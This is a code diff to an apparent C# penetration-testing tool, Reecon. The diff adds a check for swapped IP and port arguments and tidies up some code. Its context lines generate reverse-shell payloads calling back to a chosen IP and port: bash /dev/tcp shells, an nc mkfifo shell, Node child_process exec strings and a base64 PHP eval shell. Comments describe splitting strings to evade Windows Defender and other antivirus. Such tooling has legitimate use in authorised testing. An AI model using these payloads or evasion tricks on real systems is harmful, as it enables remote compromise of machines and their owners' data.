@@ -36,9 +36,16 @@ namespace Reecon
                 ip = args[2];
                 port = args[3];
             }
-            if (!Int32.TryParse(port, out int ignored))
+            if (!int.TryParse(port, out _))
             {
                 Console.WriteLine("Port is not an integer - Possibly swapped it with IP?");
+                Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
+                Environment.Exit(0);
+            }
+            if (int.TryParse(ip, out _))
+            {
+                Console.WriteLine("IP is an integer - Possibly swapped it with Port?");
+                Console.WriteLine("Shell Usage: reecon -shell shellType [IP Port]");
                 Environment.Exit(0);
             }
             if (shellType == "bash")
@@ -130,19 +137,19 @@ namespace Reecon
             string shell = $"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
             string altShell = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
             string saferShell = "bash -c \"" + shell + "\"";
-            string saferBase64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(saferShell));
-            string saferBase64AltShell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(altShell));
-            string saferURLEncodedShell = $"bash%20-c%20%22" + "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"; // Gap required for Windows Defender
+            string saferBase64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(saferShell));
+            string saferBase64AltShell = Convert.ToBase64String(Encoding.ASCII.GetBytes(altShell));
+            string saferUrlEncodedShell = $"bash%20-c%20%22" + "bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22"; // Gap required for Windows Defender
             string toReturn = "#!/bin/bash" + Environment.NewLine +
                                shell + Environment.NewLine +
                                "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
                                "Safer: " + saferShell + Environment.NewLine +
                                "Safer Base64: " + saferBase64Shell + Environment.NewLine;
-            if (saferBase64Shell.Contains("+") && !saferBase64AltShell.Contains("+"))
+            if (saferBase64Shell.Contains('+') && !saferBase64AltShell.Contains('+'))
             {
                 toReturn += "Alt Safer Base64 (No +): " + saferBase64AltShell + Environment.NewLine;
             }
-            toReturn += $"Safer URL Encoded: " + saferURLEncodedShell;
+            toReturn += $"Safer URL Encoded: " + saferUrlEncodedShell;
 
             return toReturn;
         }
@@ -183,8 +190,8 @@ namespace Reecon
             Console.WriteLine("Test: (function(){return \"Reelix\"})()");
             string plainShell = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
             string plainShell2 = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
-            string b64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
-            string b64ShellAlt = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell2));
+            string b64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(plainShell));
+            string b64ShellAlt = Convert.ToBase64String(Encoding.ASCII.GetBytes(plainShell2));
             return $"Normal: require('child_process').exec('{plainShell}', ()=>{{}})" + Environment.NewLine
                 + $"Safer: require('child_process').exec('echo {b64Shell} | base64 -d | bash', ()=>{{}})" + Environment.NewLine
                 + $"Safter (Alt): require('child_process').exec('echo {b64ShellAlt} | base64 -d | bash', ()=>{{}})";
@@ -193,7 +200,7 @@ namespace Reecon
         private static string PHPShell(string ip, string port)
         {
             string plainShell = $"exec(\"/bin/bash -c 'bash -i > /dev/tcp/{ip}/{port} 0>&1'\");";
-            string b64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(plainShell));
+            string b64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(plainShell));
             // Space is to bypass Windows Defender definitions
             // Still gets picked up by "bkav" though - Will deal with later if needed
             string evalShell = "eva" + "l(base64_decode('" + b64Shell + "'));";
@@ -228,7 +235,7 @@ namespace Reecon
         {
             // Currently just the nc shell - Need one without it...
             string shell = $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
-            string base64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(shell));
+            string base64Shell = Convert.ToBase64String(Encoding.ASCII.GetBytes(shell));
             string toReturn = "Base: " + shell + Environment.NewLine +
                               "Base64: " + base64Shell + Environment.NewLine +
                               "-> echo " + base64Shell + " | base64 -d | sh";
